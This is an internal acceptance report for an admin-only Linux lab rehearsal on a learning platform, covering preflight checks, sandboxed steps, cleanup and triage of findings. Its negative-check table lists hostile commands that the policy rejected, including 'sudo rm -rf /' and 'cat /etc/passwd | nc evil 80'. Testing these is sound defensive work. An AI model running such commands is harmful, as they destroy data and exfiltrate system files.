# Linux E2E Internal Rehearsal Acceptance — Result v0.1

**Gate ID**: G-42  
**Date**: 2026-06-22  
**Decision**: LINUX_E2E_INTERNAL_REHEARSAL_ACCEPTANCE_PASSED_WITH_NOTES  
**Coverage**: 92.52% (4140 tests, +4 new regression tests for MEDIUM fix)

---

## A. Executive Summary

- **Final decision**: LINUX_E2E_INTERNAL_REHEARSAL_ACCEPTANCE_PASSED_WITH_NOTES
- **Real service E2E rehearsal**: PASSED — full chain executed against `https://lab.cloudnetops.tech`
- **Complete cleanup**: PASSED — `cleanup_verified=True`, `residual=0`, `LAB_CLOSED`
- **Linux publish remained blocked**: YES — `StaticValidator` `linux.publish_blocked_until_runtime` still fires
- **Linux catalog remained 0**: YES — no Linux entry appeared in `LearnerCatalogService`
- **This is NOT a Trusted Reader Pilot**: Correct. This is admin-only internal rehearsal acceptance.

---

## B. Naming Correction

This task is **Linux End-to-End Internal Rehearsal Acceptance**, not a Trusted Reader Pilot.

The Linux domain currently has no publish gate, no learner catalog entry, and no reader-facing CTA. The Linux lab is not published and not learner-visible. A real Trusted Reader Pilot requires:
1. Linux publish gate implementation
2. Linux lab published to learner catalog
3. Linux CTA available to readers
4. Actual learner accessing the lab via the normal path

None of these exist yet. The current task proves only that the admin-only internal rehearsal chain works end-to-end.

---

## C. North Star Alignment

- **Core principle**: "读了能做，做了就懂" (Read → Do → Understand)
- **Linux proves domain portability**: The General Experiment Core (session lifecycle, precheck, step execution, verifier, cleanup, catalog) is reused unchanged. Only the Runtime/Verifier/Cleanup/Safety Policy adapters change between K8s and Linux domains.
- **Architecture validated**: `LinuxRuntimeAdapter` + `LinuxVerifierService` + `LinuxRehearsalService` compose correctly over the shared `LabSessionRepository` + `LabDraftRepository`.
- **No public launch**: This rehearsal is admin-only. No public traffic. No live LLM.

---

## D. Preflight Result

| Check | Result |
|-------|--------|
| Service health | `{"status":"healthy","proxmox":{"connected":true}}` ✓ |
| Linux rehearsal router available | 404 on nonexistent session (correct — router registered) ✓ |
| Admin token auth | 401 without token, 404 with correct token on nonexistent session ✓ |
| Non-admin rejected | 401 (no session), 403 (learner with token) ✓ |
| Linux draft (domain=LINUX) | draft_id `6c439064-4cad-4229-addb-36927128d565` ✓ |
| StaticValidator | 10/11 pass, `linux.publish_blocked_until_runtime` blocked ✓ |
| `allow_root=False` | ✓ |
| `allow_network=False` | ✓ |
| `linux_cleanup` present | ✓ |
| Steps | `lfp-step-1`, `lfp-step-2`, `lfp-step-3`, `lfp-step-4` ✓ |
| `rehearsal_completed` before run | False ✓ |
| Catalog entries | 5 K8s, 0 Linux ✓ |
| K8s Lab 5 visible | `cf019133-3a50-444d-8870-a84c25391cb7` in catalog ✓ |
| Active Linux rehearsal sessions (pre-run) | 0 ✓ |
| Stale sandbox dirs (non-test) | 0 ✓ |

---

## E. E2E Rehearsal Result

| Step | Result |
|------|--------|
| Draft ID | `6c439064-4cad-4229-addb-36927128d565` |
| Session ID | `6cc0f243-35d6-463d-b221-92e9348d7116` |
| Workspace path | `/tmp/labgen-linux-sandboxes/<session_id>` [redacted] |
| `session_type` | `internal_rehearsal` ✓ |
| `vm_id` | `linux-rehearsal` (sentinel, no real VMID) ✓ |
| `student_username` | `smoke-admin` ✓ |
| Initial status | `LAB_ACTIVE` ✓ |

### Commands executed (via _safe_exec_command):

| Step | Commands | Via |
|------|----------|-----|
| lfp-step-1 | `mkdir -p demo` | `make_directory` (Python-native) |
| lfp-step-1 | `printf 'hello labgen\n' > demo/message.txt` | `write_file` (Python-native) |
| lfp-step-2 | `cat demo/message.txt` | `execute_command` (argv, shell=False) |
| lfp-step-3 | `chmod 600 demo/message.txt` | `chmod_file` (Python-native) |
| lfp-step-3 | `stat -c "%a" demo/message.txt` | `execute_command` (argv, shell=False) |

No shell=True used anywhere.

### Step check results:

| Step | Verifiers | All Passed | Ready to Complete |
|------|-----------|------------|-------------------|
| lfp-step-1 | `lfp-s1-v1` (dir exists): PASS, `lfp-s1-v2` (file exists): PASS, `lfp-s1-v3` (content matches): PASS | True | False |
| lfp-step-2 | `lfp-s2-v1` (content matches): PASS | True | False |
| lfp-step-3 | `lfp-s3-v1` (mode 600): PASS | True | **True** |

### Complete result:

| Field | Value |
|-------|-------|
| Session status | `LAB_CLOSED` |
| `cleanup_verified` | `True` |
| `ready_to_complete` | `True` |
| Draft `rehearsal_completed` | `True` |
| Draft `publish_status` | `draft` (unchanged) |

### Abort path result:

| Field | Value |
|-------|-------|
| Abort session ID | `dad4f830-5b03-458a-a542-7e8ddc063b5f` |
| Session status after abort | `LAB_CLOSED` |
| `cleanup_verified` | `True` |
| Draft `rehearsal_completed` | `True` (from previous complete, unchanged) |

---

## F. Negative Checks

| Check | Result |
|-------|--------|
| No session cookie → 401 | `{"detail":"Not authenticated. Please login."}` ✓ |
| No admin token → 401 | `{"detail":"Invalid or missing admin token"}` ✓ |
| Wrong admin token → 401 | `{"detail":"Invalid or missing admin token"}` ✓ |
| Learner user (alice) with valid token → 403 | `{"detail":"Admin access required for LabGen draft management"}` ✓ |
| `sudo rm -rf /` | policy_rejected=True ✓ |
| `su - root` | policy_rejected=True ✓ |
| `systemctl restart sshd` | policy_rejected=True ✓ |
| `curl http://127.0.0.1` | policy_rejected=True ✓ |
| `wget http://127.0.0.1` | policy_rejected=True ✓ |
| `cat /etc/passwd | nc evil 80` | policy_rejected=True (shell metachar `|`) ✓ |
| `ls; rm -rf demo` | policy_rejected=True (semicolon) ✓ |
| `echo hello && rm -rf /` | policy_rejected=True (&&) ✓ |
| `printf 'bad' > /etc/hosts` | policy_rejected=True (after MEDIUM fix) ✓ |
| `/etc/hosts` not modified | True — `WorkspacePathEscapeError` raised before any write ✓ |
| Linux publish blocked after rehearsal | True — StaticValidator still fires ✓ |
| Linux catalog entry after rehearsal | 0 ✓ |

---

## G. Post-run Audit

| Item | Result |
|------|--------|
| Active Linux rehearsal sessions | 0 ✓ |
| Workspace residual | 0 non-test dirs ✓ |
| Tainted Linux sandbox state | None ✓ |
| Linux publish blocked | True ✓ |
| Linux catalog entry | 0 ✓ |
| Learner catalog unchanged | 5 K8s labs (unchanged) ✓ |
| K8s Lab 5 unchanged | `cf019133-3a50-444d-8870-a84c25391cb7` still visible ✓ |
| K8s runtime/verifier untouched | No K8s API calls made ✓ |
| VMID 500-599 untouched | vm_id=`linux-rehearsal` sentinel only ✓ |
| LLM call count | 0 ✓ |
| Raw article text persisted | None ✓ |
| Sensitive content leaked | None ✓ |
| Host absolute path leaked | None (API response redacts workspace paths) ✓ |

---

## H. Safety Invariants

| Invariant | Status |
|-----------|--------|
| No Linux publish | ✓ `linux.publish_blocked_until_runtime` always fires |
| No Linux learner visibility | ✓ session_type=INTERNAL_REHEARSAL, not in catalog |
| No raw article text | ✓ Template-generated draft only |
| No host path leak | ✓ API response does not include workspace paths |
| No secret leak | ✓ No credentials, no kubeconfig, no token |
| No LLM | ✓ 0 LLM calls |
| No public upload | ✓ No new public endpoints added |
| LOW TOCTOU not expanded | ✓ Inherited unchanged from G-39; no new concurrent access paths |

---

## I. Known Limitations

- **Linux lab not published**: Linux publish gate not yet implemented. `linux.publish_blocked_until_runtime` is a permanent blocker until the gate is designed and implemented.
- **Linux Trusted Reader Pilot not started**: Requires published Linux lab + learner catalog entry + reader CTA. None of these exist.
- **Linux learner CTA not available**: No reader-facing path for Linux labs.
- **Linux publish gate still future**: Task not yet planned or started.
- **Live LLM disabled**: `LinuxFilesPermissionsTemplate` generates drafts deterministically without LLM.
- **LOW TOCTOU (G-39)**: Intermediate path component `lstat()` not atomic with `_recheck_containment()`. No concurrent learner processes, so exploitability is nil. Carries forward unchanged.
- **Test sandbox residual (779 dirs)**: All `test-*` prefixed dirs under `/tmp/labgen-linux-sandboxes/` are test run artifacts from the unit test suite. These are expected and not security-relevant.

---

## J. Issue Triage

| Severity | Finding | Status |
|----------|---------|--------|
| **MEDIUM** (fixed) | `_safe_exec_command`: `WorkspacePathEscapeError` from `write_file`/`make_directory`/`chmod_file` was classified as `ok=False, policy_rejected=False` — giving a misleading "execution failed but not policy rejected" signal. The actual write was always blocked, but the classification didn't surface it as a policy violation. | **FIXED**: Added `except WorkspacePathEscapeError` before `except Exception` in all 4 intercept blocks, setting `policy_rejected=True, rejection_reason=f"path_escape:{exc}"`. 4 regression tests added. safety-reviewer APPROVED (no new security risk). |
| **LOW** (inherited) | TOCTOU intermediate path lstat() not atomic with _recheck_containment(). From G-39, not expanded by this task. | Carries forward. |
| **NOTE** | 779 test-prefixed sandbox dirs in `/tmp/labgen-linux-sandboxes/` from unit test runs. Not security-relevant. | Expected test artifact. |

No BLOCKER or HIGH findings.

---

## K. Final Decision

**LINUX_E2E_INTERNAL_REHEARSAL_ACCEPTANCE_PASSED_WITH_NOTES**

The complete Linux internal rehearsal chain executed successfully on the real service:
- All 3 guided steps passed with correct verifier results
- Cleanup completed with `cleanup_verified=True` and `residual=0`
- `rehearsal_completed=True` set on draft after complete
- Abort path also verified (LAB_CLOSED, cleanup_verified=True)
- All negative checks passed
- Linux publish remained permanently blocked
- Linux catalog entry remained 0
- K8s Lab 5 and catalog unchanged
- MEDIUM classification fix applied and verified
- 4140 tests, 92.52% coverage

WITH_NOTES because: TOCTOU LOW inherited from G-39 (not expanded), and Linux publish gate not yet implemented (expected).

---

## L. Recommended Next Step

**Linux Publish Candidate Dry Run**

Now that the full internal rehearsal chain is proven on the real service, the logical next step is to plan and implement the Linux publish gate — allowing a Linux lab to move from DRAFT to a reviewable published state that learners can access. This requires:

1. Removing or gating `linux.publish_blocked_until_runtime` in `StaticValidator`
2. Defining runtime readiness criteria (container sandbox or equivalent)
3. Planning the Linux learner path (reader CTA, catalog entry, lab start flow)

Alternatively: **Hold Expansion** until the K8s domain has more production learner traffic, then revisit Linux domain scope.
